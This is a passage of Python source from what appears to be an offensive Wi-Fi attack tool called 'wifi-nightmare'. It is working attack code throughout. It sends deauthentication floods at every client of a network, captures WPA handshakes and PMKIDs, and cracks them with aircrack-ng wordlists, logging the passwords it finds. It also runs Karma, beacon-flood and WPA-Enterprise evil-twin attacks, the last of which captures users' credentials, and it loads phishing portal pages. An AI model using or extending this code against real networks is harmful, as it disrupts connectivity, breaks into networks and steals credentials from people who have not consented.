        if current_ssid == "<HIDDEN>": current_ssid = "Unknown"
        
        if NetworkAttacker is None:
            print(f"{C_RED}[!] Error: NetworkAttacker module not available.{C_RESET}")
            return
        
        utils.run_command(["ip", "link", "set", self.interface, "up"])
        utils.run_command(["iw", "dev", self.interface, "set", "channel", str(channel)])
        # "reveal"/"passive" build NetworkAttacker(interface=self.injector_interface)
        # below and inject deauth there directly -- unlike mode=="handshake",
        # which locks the injector's channel itself inside capture_handshake().
        # Without this, the injector card stays parked on whatever channel it
        # was last left on and every deauth frame misses this target.
        if self.injector_interface != self.interface:
            utils.run_command(["iw", "dev", self.injector_interface, "set", "channel", str(channel)])

        # --- Native handshake capture (airodump-ng + mdk4/aireplay-ng) ---
        if mode == "handshake":
            timeout = 120
            try:
                from wifi_nightmare.config import config as cfg
                timeout = cfg.get("attacks", {}).get("handshake_timeout", 120)
            except Exception:
                pass

            result = capture_handshake(
                interface=self.sniffer_interface,
                bssid=bssid,
                channel=channel,
                timeout=timeout,
                ssid=current_ssid,
                injector_interface=self.injector_interface
            )

            if result:
                self.db.save(bssid, current_ssid)
                self.db.update_handshake(bssid, True, utils.get_current_time_12h(), filename=result)
                print(f"\n{C_GREEN}[+] Handshake captured!{C_RESET}")
                print(f"    File: {result}")
            else:
                print(f"\n{C_RED}[-] Handshake capture failed{C_RESET}")

            if not auto_exit:
                input("\nPress Enter to return to menu...")
            return

        attacker = NetworkAttacker(
            interface=self.injector_interface, 
            target_bssid=bssid, 
            target_channel=channel, 
            db_handler=self.db, 
            attack_mode=mode, 
            target_ssid=current_ssid
        )
        
        msg = f"Mode: {mode.upper()}"
        print(f"{C_RED}[*] Starting: {msg} (Ctrl+C to Stop)...{C_RESET}")
        logger.info(f"Starting attack on {utils.mask_bssid(bssid)} ({mode})")
        
        with utils.SignalManager() as sig:
            # Start deauth thread for appropriate modes
            if mode in ["deauth_only", "handshake", "reveal"]:
                attacker.start_deauth_thread()
                if mode == "deauth_only":
                    print(f"{C_YELLOW}[+] Sending deauth packets to {utils.mask_bssid(bssid)}{C_RESET}")
                    print(f"{C_YELLOW}[+] Targeting all clients on channel {channel}{C_RESET}")

            # Start sniffer in a continuous background thread (gapless)
            sniffer_running = threading.Event()
            sniffer_running.set()
            def _sniffer_thread():
                def _should_stop(pkt):
                    return not sniffer_running.is_set()
                def _quick_filter(pkt):
                    return pkt.haslayer(Dot11) or pkt.haslayer(EAPOL)
                try:
                    sniff(iface=self.sniffer_interface, prn=attacker.sniffer_callback,
                          store=0, stop_filter=_should_stop, lfilter=_quick_filter)
                except Exception as e:
                    logger.error(f"Sniffer thread crashed: {e}")
            st = threading.Thread(target=_sniffer_thread, daemon=True)
            st.start()

            esp_active = False
            if self.esp_driver and self.esp_driver.is_connected:
                if mode != "passive":
                    print(f"{C_YELLOW}[+] ESP Detected: Using 'Burst' Attack Mode.{C_RESET}")
                    esp_active = True

            loop_count = 0 
            last_esp_attack = 0 
            deauth_count = 0

            while not attacker.stop_attack:
                if sig.stopped:
                    attacker.stop_attack = True
                    break

                if mode == "handshake" and attacker.handshake_captured: 
                    if attacker.target_ssid in ("Unknown", "<HIDDEN>"):
                        if not hasattr(attacker, 'reveal_wait_start'):
                            attacker.reveal_wait_start = time.time()
                            print(f"\n{C_YELLOW}[*] Handshake captured. Waiting for SSID Reveal...{C_RESET}")
                        if time.time() - attacker.reveal_wait_start > 10:
                            break
                    else:
                        break
                
                if mode == "pmkid" and attacker.pmkid_captured: 
                    break
                if mode == "reveal" and attacker.success: 
                    break
                
                current_time = time.time()
                loop_count += 1 
                
                if mode == "passive":
                    status = "Listening"
                elif mode == "deauth_only":
                    status = "Deauthing"
                    if hasattr(attacker, 'deauth_sent'):
                        deauth_count = attacker.deauth_sent
                else:
                    status = "Attacking"
                
                if esp_active and mode != "passive":
                    if current_time - last_esp_attack > 5:
                        self.esp_driver.start_attack(bssid, channel, duration=2)
                        last_esp_attack = current_time

                clients_str = f"{len(attacker.clients)} Clients"
                eapol_str = f" | EAPOL: {len(attacker.eapol_packets)}" if attacker.eapol_packets else ""
                if mode == "deauth_only":
                    clients_str = f"{len(attacker.clients)} Clients, {deauth_count} Deauths"
                
                ssid_display = attacker.target_ssid if attacker.target_ssid != "Unknown" else ""
                if ssid_display: 
                    ssid_display = f"({C_GREEN}{ssid_display}{C_RESET}) "

                dual_msg = f" {C_RED}+ ESP{C_RESET}" if esp_active else ""
                alert_msg = ""
                
                if hasattr(attacker, 'extended_capture_start'):
                    elapsed = int(time.time() - attacker.extended_capture_start)
                    remaining = max(0, 10 - elapsed)
                    alert_msg = f" {C_CYAN}[Context frames: {remaining}s]{C_RESET}"
                elif attacker.handshake_captured: 
                    alert_msg = f" {C_GREEN}[HANDSHAKE!]{C_RESET}"
                elif attacker.pmkid_captured: 
                    alert_msg = f" {C_GREEN}[PMKID!]{C_RESET}"

                sys.stdout.write(f"\r\033[K[{loop_count}] [*] {status}{dual_msg}{alert_msg} {ssid_display}> {clients_str}{eapol_str} | Pkts: {attacker.sniff_count}")
                sys.stdout.flush()
                
                time.sleep(0.5)

        sniffer_running.clear()
        attacker.stop_attack = True
        attacker.join_threads()
        
        if esp_active:
            self.esp_driver.stop_all()

        if mode == "deauth_only":
            print(f"\n{C_YELLOW}[*] Deauth Attack Finished{C_RESET}")
            print(f"    Target: {utils.mask_bssid(bssid)}")
            print(f"    Channel: {channel}")
            print(f"    SSID: {current_ssid if current_ssid != 'Unknown' else 'Hidden'}")
            print(f"    Clients Targeted: {len(attacker.clients)}")
            if hasattr(attacker, 'deauth_sent'):
                print(f"    Deauth Packets Sent: {attacker.deauth_sent}")
            print(f"    Duration: {loop_count * 0.5:.1f} seconds")
            
        elif attacker.handshake_captured or attacker.pmkid_captured:
            final_ssid = attacker.target_ssid
            if final_ssid != "Unknown":
                self.db.save(bssid, final_ssid)
            
            f_type = "PMKID" if attacker.pmkid_captured else "Handshake"
            self.db.update_handshake(bssid, True, utils.get_current_time_12h(), filename=attacker.handshake_filename)
            
            logger.info(f"{f_type} captured for {utils.mask_bssid(bssid)}")
            print(f"\n{C_CYAN}[+] {f_type} Captured!{C_RESET}")
            print(f"    Saved to: {attacker.handshake_filename}")
            
        elif mode == "reveal" and attacker.success:
            self.db.save(bssid, attacker.result_data['SSID'])
            ui.print_attack_summary(attacker.result_data)
            
        else:
            print("\n[!] Attack Finished/Stopped.")
        
        if not auto_exit:
            input("\nPress Enter to return to menu...")

    def database_workflow(self):
        while True:
            ui.print_database_menu()
            op = ui.menu_input("Select Action: ")
            if op == '1':
                ui.show_saved_db(self.db)
                input("Press Enter...")
            elif op == '2':
                self.verify_password_logic()
            elif op == '0':
                break
            else:
                 print(f"\n{C_RED}[!] Invalid option.{C_RESET}")
                 time.sleep(0.5)

    def verify_password_logic(self):
        saved_list = ui.show_saved_db(self.db)
        if not saved_list:
            input("Press Enter...")
            return
            
        choice = input(f"{C_YELLOW}[?]{C_RESET} Enter Network ID to verify: ").strip()
        if choice.isdigit():
            idx = int(choice)
            if 0 <= idx < len(saved_list):
                bssid = saved_list[idx]
                data = self.db.get_info(bssid)
                pcap = data.get('HSFile', '')
                if not pcap or not os.path.exists(pcap):
                    print(f"{C_RED}[-] File missing.{C_RESET}")
                    input("Enter...")
                    return
                pwd = input(f"[?] Password for {data['SSID']}: ").strip()
                result = utils.verify_password(pcap, bssid, data['SSID'], pwd)
                if result is True:
                    print(f"\n{C_GREEN}[SUCCESS] Correct Password!{C_RESET}")
                elif result is None:
                    print(f"\n{C_RED}[!] No usable handshake in the capture.{C_RESET}")
                    print(f"{C_YELLOW}    Cannot verify — re-capture the handshake first.{C_RESET}")
                else:
                    print(f"\n{C_RED}[FAILURE] Incorrect.{C_RESET}")
                input("Enter...")
        else:
            print(f"{C_RED}[!] Invalid ID.{C_RESET}")
            time.sleep(1)

    def run_aircrack_crack(self, bssid, ssid):
        """Directly crack a captured handshake with aircrack-ng + a wordlist,
        without leaving the tool."""
        info = self.db.get_info(bssid)
        if not (info and info.get('HSFile') and os.path.exists(info['HSFile'])):
            print(f"\n{C_RED}[!] No handshake for this target. Capture one first (Option 1).{C_RESET}")
            input("\nPress Enter...")
            return

        if not shutil.which("aircrack-ng"):
            print(f"\n{C_RED}[!] aircrack-ng not found. Install: sudo apt install aircrack-ng{C_RESET}")
            input("\nPress Enter...")
            return

        pcap = info['HSFile']
        print(f"\n{C_CYAN}[*] Handshake: {pcap}{C_RESET}")
        print(f"{C_CYAN}[*] Target   : {ssid} ({utils.mask_bssid(bssid)}){C_RESET}")

        wordlist = input(f"{C_YELLOW}[?]{C_RESET} Wordlist path: ").strip()
        wordlist = os.path.expanduser(wordlist)
        if not wordlist:
            print(f"{C_RED}[!] Aborted.{C_RESET}")
            return
        if not os.path.isfile(wordlist):
            print(f"{C_RED}[!] Wordlist not found: {wordlist}{C_RESET}")
            return
        if os.path.getsize(wordlist) == 0:
            print(f"{C_RED}[!] Wordlist is empty.{C_RESET}")
            return

        # `-b` targets the right AP. We deliberately skip `-e`: the exact
        # ESSID string match can silently zero-out the handshake on unusual
        # SSIDs (hidden networks, case/whitespace mismatches).
        cmd = ["aircrack-ng", "-a", "2", "-b", bssid, "-w", wordlist, pcap]
        # Show the command with the full BSSID scrubbed from the display only —
        # the executed command still targets the real AP.
        print(f"\n{C_YELLOW}[*] Running: {utils.scrub_bssid(' '.join(cmd), bssid)}{C_RESET}")
        print(f"{C_YELLOW}[*] Ctrl+C to stop...{C_RESET}\n")

        password = None
        saw_not_in_wordlist = False
        saw_no_handshake = False
        proc = None
        try:
            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                stdin=subprocess.DEVNULL
            )
            # Stream raw output live (keeps aircrack-ng's progress bar with
            # \r updates visible), and scan completed lines for the verdict.
            buf = b""
            while True:
                chunk = proc.stdout.read(4096)
                if not chunk:
                    break
                sys.stdout.write(chunk.decode(errors="replace"))
                sys.stdout.flush()
                buf += chunk
                while b"\n" in buf:
                    line, buf = buf.split(b"\n", 1)
                    text = line.decode(errors="replace")
                    if "KEY FOUND!" in text:
                        m = re.search(r"KEY FOUND!\s*\[\s*([^\]\r\n]+?)\s*\]", text)
                        if m:
                            password = m.group(1).strip()
                    elif "Passphrase not in dictionary" in text:
                        saw_not_in_wordlist = True
                    elif "No valid WPA handshakes" in text or re.search(r"\b0\s+handshake", text):
                        saw_no_handshake = True
            proc.wait()
        except KeyboardInterrupt:
            print(f"\n\n{C_RED}[!] Cracking stopped by user.{C_RESET}")
            if proc is not None:
                try:
                    proc.kill()
                except Exception:
                    pass
                proc.wait()
            input("\nPress Enter...")
            return
        except Exception as e:
            print(f"\n{C_RED}[!] Error running aircrack-ng: {e}{C_RESET}")
            input("\nPress Enter...")
            return

        if password:
            print(f"\n{C_GREEN}[+] PASSWORD FOUND: {C_WHITE}{password}{C_RESET}")
            with open("cracked.txt", "a") as f:
                ts = time.strftime("%Y-%m-%d %H:%M:%S")
                f.write(f"[{ts}] SSID: {ssid} | MAC: {utils.mask_bssid(bssid)} | Password: {password}\n")
            print(f"{C_GREEN}    Saved to cracked.txt{C_RESET}")
        elif saw_no_handshake:
            print(f"\n{C_RED}[!] No valid WPA handshake in the capture.{C_RESET}")
            print(f"{C_YELLOW}    Re-capture the handshake first (Option 1), then crack again.{C_RESET}")
        elif saw_not_in_wordlist:
            print(f"\n{C_YELLOW}[-] Dictionary exhausted - password not in the wordlist.{C_RESET}")
        else:
            print(f"\n{C_YELLOW}[-] Finished - password not found.{C_RESET}")

        input("\nPress Enter...")

    def custom_portal_workflow(self):
        has_esp = self.esp_driver and self.esp_driver.is_connected
        template_names = portals.list_templates()

        while True:
            # Check if custom portal is active locally
            status = f"{C_GREEN}Default (built-in){C_RESET}"
            if os.path.exists("custom_portal.html"):
                status = f"{C_CYAN}Custom (custom_portal.html){C_RESET}"

            ui.print_portal_menu(template_names, status, has_esp)

            choice = ui.menu_input("Select Action: ")

            if choice == '0':
                break
            elif choice.isdigit() and 1 <= int(choice) <= len(template_names):
                name = template_names[int(choice) - 1]
                html = portals.get_template(name)
                if html:
                    print(f"\n{C_CYAN}[*] Template: {name}{C_RESET}")
                    print(f"    Size: {len(html)} bytes")
                    preview = portals.get_template_preview(name)
                    print(f"    {preview}")

                    # Save locally
                    confirm = input(f"{C_YELLOW}[?] Save as custom portal? (y/n): {C_RESET}").strip().lower()
                    if confirm == 'y':
                        with open("custom_portal.html", "w", encoding="utf-8") as f:
                            f.write(html)
                        print(f"{C_GREEN}[+] Saved to custom_portal.html{C_RESET}")

                        # Also upload to ESP if connected
                        if has_esp:
                            upload = input(f"{C_YELLOW}[?] Also upload to ESP? (y/n): {C_RESET}").strip().lower()
                            if upload == 'y':
                                self.esp_driver.send_custom_portal(html)
                    input("Press Enter...")
            elif choice.upper() == 'C':
                # Load from file
                filepath = input(f"{C_YELLOW}[?] Enter HTML file path: {C_RESET}").strip()
                filepath = filepath.strip('"').strip("'")
                if not os.path.exists(filepath):
                    print(f"{C_RED}[!] File not found: {filepath}{C_RESET}")
                    input("Press Enter...")
                    continue
                try:
                    with open(filepath, 'r', encoding='utf-8') as f:
                        html = f.read()
                    print(f"{C_CYAN}[*] Loaded {len(html)} bytes from {filepath}{C_RESET}")

                    if len(html) > ESP_HTML_LIMIT and has_esp:
                        print(f"{C_YELLOW}[!] Warning: {len(html)} bytes — ESP max is {ESP_HTML_LIMIT}. Software Evil Twin has no limit.{C_RESET}")

                    confirm = input(f"{C_YELLOW}[?] Save as custom portal? (y/n): {C_RESET}").strip().lower()
                    if confirm == 'y':
                        with open("custom_portal.html", "w", encoding="utf-8") as f:
                            f.write(html)
                        print(f"{C_GREEN}[+] Saved to custom_portal.html{C_RESET}")

                        if has_esp and len(html) <= ESP_HTML_LIMIT:
                            upload = input(f"{C_YELLOW}[?] Also upload to ESP? (y/n): {C_RESET}").strip().lower()
                            if upload == 'y':
                                self.esp_driver.send_custom_portal(html)
                    input("Press Enter...")
                except Exception as e:
                    print(f"{C_RED}[!] Error reading file: {e}{C_RESET}")
                    input("Press Enter...")
            elif choice.upper() == 'R':
                # Reset
                if os.path.exists("custom_portal.html"):
                    os.remove("custom_portal.html")
                    print(f"{C_GREEN}[+] Removed custom_portal.html{C_RESET}")
                else:
                    print(f"{C_YELLOW}[*] No custom portal to remove{C_RESET}")

                if has_esp:
                    confirm = input(f"{C_YELLOW}[?] Also clear from ESP? (y/n): {C_RESET}").strip().lower()
                    if confirm == 'y':
                        self.esp_driver.clear_custom_portal()
                input("Press Enter...")
            else:
                print(f"{C_RED}[!] Invalid option{C_RESET}")
                time.sleep(0.5)

    def run_pmkid_attack(self, bssid: str, channel: int, ssid: str):
        """Run PMKID attack (clientless WPA2 hash harvesting)."""
        if PMKIDAttack is None:
            print(f"{C_RED}[!] PMKID module not available.{C_RESET}")
            input("Press Enter...")
            return
        try:
            from wifi_nightmare.config import config as cfg
            timeout = cfg.get('attacks', {}).get('pmkid_timeout', 60)
        except Exception:
            timeout = 60

        utils.run_command(["ip", "link", "set", self.interface, "up"])
        utils.run_command(["iw", "dev", self.interface, "set", "channel", str(channel)])
        if self.sniffer_interface != self.interface:
            utils.run_command(["iw", "dev", self.sniffer_interface, "set", "channel", str(channel)])

        attacker = PMKIDAttack(
            interface=self.sniffer_interface,
            bssid=bssid,
            channel=channel,
            ssid=ssid,
            timeout=timeout
        )

        with utils.SignalManager() as sig:
            def _pmkid_thread():
                attacker.run()
            t = threading.Thread(target=_pmkid_thread, daemon=True)
            t.start()
            while t.is_alive():
                if sig.stopped:
                    attacker.stop()
                    break
                t.join(timeout=0.5)

        if attacker.results:
            result = attacker.results[0]
            self.db.save(bssid, ssid)
            self.db.update_handshake(bssid, True, utils.get_current_time_12h(),
                                     filename=result.hc22000_line[:100])
            print(f"\n{C_GREEN}[+] PMKID saved! Crack with: hashcat -m 22000 <file> <wordlist>{C_RESET}")
        input(f"\n{C_YELLOW}Press Enter to return...{C_RESET}")

    def run_karma_attack(self, bssid: str, channel: int, ssid: str):
        """Run Karma Attack — respond to all Probe Requests."""
        if KarmaAttack is None:
            print(f"{C_RED}[!] Karma module not available.{C_RESET}")
            input("Press Enter...")
            return

        print(f"\n{C_CYAN}--- KARMA ATTACK ---{C_RESET}")
        print(f"{C_WHITE}[1] Target SSID only (respond only to probes for '{ssid}'){C_RESET}")
        print(f"{C_WHITE}[2] Respond ALL (full Karma — respond to any probe){C_RESET}")
        mode_choice = input(f"{C_YELLOW}[?]{C_RESET} Mode [1]: ").strip() or '1'

        target_ssids = [ssid] if mode_choice != '2' else None
        respond_all = (mode_choice == '2')

        utils.run_command(["ip", "link", "set", self.interface, "up"])
        utils.run_command(["iw", "dev", self.interface, "set", "channel", str(channel)])
        if self.injector_interface != self.interface:
            utils.run_command(["iw", "dev", self.injector_interface, "set", "channel", str(channel)])

        karma = KarmaAttack(
            interface=self.injector_interface,
            target_ssids=target_ssids,
            channel=channel,
            respond_all=respond_all
        )
        with utils.SignalManager() as sig:
            def _karma_thread():
                karma.run()
            t = threading.Thread(target=_karma_thread, daemon=True)
            t.start()
            while t.is_alive():
                if sig.stopped:
                    karma.stop()
                    break
                t.join(timeout=0.5)

        input(f"\n{C_YELLOW}Press Enter to return...{C_RESET}")

    def run_beacon_flood(self, bssid: str, channel: int, ssid: str):
        """Run Beacon Flood attack."""
        if BeaconFlood is None:
            print(f"{C_RED}[!] BeaconFlood module not available.{C_RESET}")
            input("Press Enter...")
            return

        print(f"\n{C_CYAN}--- BEACON FLOOD ---{C_RESET}")
        print(f"{C_WHITE}[1] Clone SSID (flood with '{ssid}' clones){C_RESET}")
        print(f"{C_WHITE}[2] Common SSIDs (flood with popular network names){C_RESET}")
        print(f"{C_WHITE}[3] Random SSIDs{C_RESET}")
        flood_choice = input(f"{C_YELLOW}[?]{C_RESET} Mode [1]: ").strip() or '1'

        modes = {'1': 'clone', '2': 'common', '3': 'random'}
        mode = modes.get(flood_choice, 'clone')

        utils.run_command(["ip", "link", "set", self.interface, "up"])
        utils.run_command(["iw", "dev", self.interface, "set", "channel", str(channel)])
        if self.injector_interface != self.interface:
            utils.run_command(["iw", "dev", self.injector_interface, "set", "channel", str(channel)])

        flooder = BeaconFlood(
            interface=self.injector_interface,
            mode=mode,
            ssid=ssid,
            channel=channel
        )
        with utils.SignalManager() as sig:
            def _flood_thread():
                flooder.run()
            t = threading.Thread(target=_flood_thread, daemon=True)
            t.start()
            while t.is_alive():
                if sig.stopped:
                    flooder.stop()
                    break
                t.join(timeout=0.5)

        input(f"\n{C_YELLOW}Press Enter to return...{C_RESET}")

    def run_wpa_enterprise(self, bssid: str, channel: int, ssid: str):
        """Run WPA-Enterprise Evil Twin for credential harvesting."""
        if WPAEnterpriseEvil is None:
            print(f"{C_RED}[!] WPA-Enterprise module not available.{C_RESET}")
            input("Press Enter...")
            return

        print(f"\n{C_CYAN}--- WPA-ENTERPRISE EVIL TWIN ---{C_RESET}")
        print(f"{C_YELLOW}[!] This will clone '{ssid}' as a WPA-Enterprise AP{C_RESET}")
        print(f"{C_YELLOW}[!] Any user entering enterprise credentials will be captured{C_RESET}")
        confirm = input(f"{C_YELLOW}[?] Start attack? (y/n): {C_RESET}").strip().lower()
        if confirm != 'y':
            return

        attack = WPAEnterpriseEvil(
            interface=self.original_interface,
            ssid=ssid,
            channel=channel,
            bssid=bssid
        )
        with utils.SignalManager() as sig:
            def _ent_thread():
                attack.run()
            t = threading.Thread(target=_ent_thread, daemon=True)
            t.start()
            while t.is_alive():
                if sig.stopped:
                    attack.stop()
                    break
                t.join(timeout=0.5)

        input(f"\n{C_YELLOW}Press Enter to return...{C_RESET}")

    def run_smart_crack(self, bssid: str, ssid: str):
        """Run Smart Wordlist crack (SSID-smart + rockyou)."""
        info = self.db.get_info(bssid)
        if not (info and info.get('HSFile') and os.path.exists(info['HSFile'])):
            print(f"{C_RED}[!] No handshake for this target. Capture one first (Option 1).{C_RESET}")
            input("\nPress Enter...")
            return

        if not shutil.which('aircrack-ng'):
            print(f"{C_RED}[!] aircrack-ng not found.{C_RESET}")
            input("\nPress Enter...")
            return

        wordlist_path = self.wordlist_mgr.interactive_select(ssid, bssid)
        if not wordlist_path:
            return

        self.run_aircrack_crack_with_wordlist(bssid, ssid, wordlist_path)

    def run_aircrack_crack_with_wordlist(self, bssid: str, ssid: str, wordlist: str):
        """Run aircrack-ng with a given wordlist path."""
        info = self.db.get_info(bssid)
        if not info:
            return
        pcap = info.get('HSFile', '')
        if not pcap or not os.path.exists(pcap):
            print(f"{C_RED}[!] Handshake file not found.{C_RESET}")
            return
        if not os.path.isfile(wordlist):
            print(f"{C_RED}[!] Wordlist not found: {wordlist}{C_RESET}")
            return

        cmd = ['aircrack-ng', '-a', '2', '-b', bssid, '-w', wordlist, pcap]
        print(f"\n{C_YELLOW}[*] Running: aircrack-ng with smart wordlist (Ctrl+C to stop){C_RESET}\n")
        password = None
        proc = None
        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                                    stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
            buf = b''
            while True:
                chunk = proc.stdout.read(4096)
                if not chunk:
                    break
                sys.stdout.write(chunk.decode(errors='replace'))
                sys.stdout.flush()
                buf += chunk
                while b'\n' in buf:
                    line, buf = buf.split(b'\n', 1)
                    if b'KEY FOUND!' in line:
                        m = re.search(r'KEY FOUND!\s*\[\s*([^\]\r\n]+?)\s*\]', line.decode(errors='replace'))
                        if m:
                            password = m.group(1).strip()
            proc.wait()
        except KeyboardInterrupt:
            if proc:
                try:
                    proc.kill()
                except Exception:
                    pass
                proc.wait()
        except Exception as e:
            print(f"{C_RED}[!] Error: {e}{C_RESET}")

        if password:
            print(f"\n{C_GREEN}[+] PASSWORD FOUND: {C_WHITE}{password}{C_RESET}")
            ts = time.strftime('%Y-%m-%d %H:%M:%S')
            with open('cracked.txt', 'a') as f:
                f.write(f"[{ts}] SSID: {ssid} | MAC: {utils.mask_bssid(bssid)} | Password: {password}\n")
            print(f"{C_GREEN}    Saved to cracked.txt{C_RESET}")
        else:
            print(f"\n{C_YELLOW}[-] Password not found in wordlist.{C_RESET}")
        input("\nPress Enter...")


def entry_point():
    """Console entry point for 'wifi-nightmare' command (generated by setuptools)."""
    import platform

    # Platform check
    if platform.system() != "Linux":
        print(f"{C_RED}[!] {APP_NAME} requires Linux. Current OS: {platform.system()}{C_RESET}")
        sys.exit(1)

    # Subcommand: flash-esp
    if len(sys.argv) >= 2 and sys.argv[1] == "flash-esp":
        from wifi_nightmare.flash_esp import main as flash_main
        flash_main(sys.argv[2:])
        return

    # Normal usage: wifi-nightmare <interface> [serial_port]
    setup_logger()

    if len(sys.argv) < 2 or len(sys.argv) > 3:
        print(f"{C_YELLOW}Usage:{C_RESET} sudo wifi-nightmare <interface> [serial_port]")
        print(f"{C_YELLOW}Ex 1 (Standalone):{C_RESET} sudo wifi-nightmare wlan0")
        print(f"{C_YELLOW}Ex 2 (With ESP):{C_RESET} sudo wifi-nightmare wlan0 /dev/ttyUSB0")
        print(f"{C_YELLOW}ESP Flash:{C_RESET} sudo wifi-nightmare flash-esp <port> [--board esp32|esp8266]")
        sys.exit(1)

    from wifi_nightmare.dep_check import check_dependencies, check_cloudflared
    check_dependencies()
    check_cloudflared()

    port = sys.argv[2] if len(sys.argv) == 3 else None

    try:
        app = WifiGTR(sys.argv[1], port)
        app.start()
    except KeyboardInterrupt:
        print(f"\n{C_YELLOW}[!] Bye.{C_RESET}")
        logger.info("User interrupted (KeyboardInterrupt)")
        try:
            app.cleanup()
        except Exception:
            pass
    except Exception as e:
        logger.exception(f"Unhandled exception: {e}")
        print(f"\n{C_RED}[!] Critical Error: {e}{C_RESET}")


if __name__ == "__main__":
    entry_point()